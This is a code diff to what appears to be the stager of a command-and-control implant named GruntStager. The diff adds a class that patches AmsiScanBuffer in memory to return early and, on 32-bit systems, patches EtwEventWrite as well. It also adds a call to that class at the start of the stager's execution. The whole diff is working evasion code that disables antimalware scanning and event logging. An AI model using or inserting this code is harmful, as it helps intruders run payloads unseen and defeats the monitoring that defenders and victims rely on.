@@ -11,9 +11,87 @@ using System.Collections.Generic;
 using System.Security.Principal;
 using System.Security.AccessControl;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 
 namespace GruntStager
 {
+    public class Patch
+	{
+	    static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+	    static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+	
+	    public static void Entry()
+	    {
+	        if (is64Bit())
+	            PatchA(x64);
+	        else
+		    {
+	            PatchA(x86);
+		        PatchE();
+		    }
+	    }
+
+        private static bool is64Bit()
+	    {
+	            bool is64Bit = true;
+	
+	            if (IntPtr.Size == 4)
+	                is64Bit = false;
+	
+	            return is64Bit;
+	    }
+	
+	    private static void PatchA(byte[] patch)
+	    {
+	        try
+	        {
+	            var lib = Win32.LoadLibrary("amsi.dll");
+	            var addr = Win32.GetProcAddress(lib, "AmsiScanBuffer");
+	
+	            uint oldProtect;
+	            Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+	
+	            Marshal.Copy(patch, 0, addr, patch.Length);
+				
+	        }
+	        catch
+			{
+	            
+	        }
+	    }
+
+		private static void PatchE()
+        {
+            try
+            {
+				byte[] patch = new byte[] { 0xc2, 0x14, 0x00 };
+                uint oldProtect;
+
+                var ntdll = Win32.LoadLibrary("ntdll.dll");
+                var etwEventSend =   Win32.GetProcAddress(ntdll, "EtwEventWrite");
+
+                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                Marshal.Copy(patch, 0, etwEventSend, patch.Length);
+            }
+            catch
+            {
+                
+            }
+        }
+	}
+
+	class Win32
+	{
+	    [DllImport("kernel32")]
+	    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+	
+	    [DllImport("kernel32")]
+	    public static extern IntPtr LoadLibrary(string name);
+	
+	    [DllImport("kernel32")]
+	    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+	}
+
     public class GruntStager
     {
         public GruntStager()
@@ -31,6 +109,8 @@ namespace GruntStager
         }
         public void ExecuteStager()
         {
+            Patch.Entry();
+
             try
             {
                 string ProfileWriteFormat = @"{{REPLACE_PROFILE_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
